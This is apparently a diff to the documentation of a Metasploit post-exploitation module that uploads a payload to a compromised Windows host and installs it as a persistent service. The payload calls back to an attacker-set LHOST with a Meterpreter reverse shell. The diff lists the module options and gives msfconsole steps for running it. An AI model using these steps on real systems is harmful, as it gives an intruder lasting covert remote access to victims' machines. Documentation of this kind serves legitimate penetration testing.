@@ -1,31 +1,44 @@
 ## Overview
-This Module will generate and upload an executable to a remote host and make it persistent service.
-It will create a new service which will start the payload whenever the service is running. Privilege is required.
+
+This Module will generate and upload an executable to a remote host, next will make it a persistent service.
+It will create a new service which will start the payload whenever the service is running. Admin or system privilege is required.
 
 ## Module Options
-LHOST  IP of host that will receive the connection from the payload.
-LPORT  Port for Payload to connect to.
-OPTIONS Comma separated list of additional options for payload if needed in 'opt=val,opt=val' format.
-PAYLOAD The payload to use in the service.
-SESSION The session to run this module on.
 
-RetryTime The retry time that shell connect failed. 5 seconds as default.
-RemoteExePath  The remote victim exe path to run. Use temp directory as default.
-RemoteExeName  The remote victim name. Random string as default.
-ServiceName    The name of service. Random string as default.'
-ServiceDescription The description of service. Random string as default.
+**LHOST**
 
+IP of host that will receive the connection from the payload.
+
+**LPORT**
+
+Port for Payload to connect to. Default: `4433`
+
+**OPTIONS**
+
+Comma separated list of additional options for payload if needed in 'opt=val,opt=val' format.
+For example: 'AutoLoadStdapi=false,StagerRetryCount=20'
+
+**PAYLOAD**
+
+The payload to use in the service. Default: `windows/meterpreter/reverse_tcp`
+
+**HANDLER**
+
+Start an exploit/multi/handler to receive the connection.
 
 ## Verification steps
-* get session on target
-* `use post/windows/manage/persistence_service`
-* `set payload <payload>`
-* `set lport <lport>`
-* `set lhost <lhost>`
-* `set handler true`
-* `run`
+
+  1. get session on target
+  2. `use post/windows/manage/persistence_service`
+  3. `set payload <payload>`
+  4. `set lport <lport>`
+  5. `set lhost <lhost>`
+  6. `set handler true`
+  7. `run`
 
 ## Usage
+
+### Windows 7 sp1 x64
 ```
 msf5 post(windows/manage/persistence_service) > sessions -i 1
 [*] Starting interaction with 1...
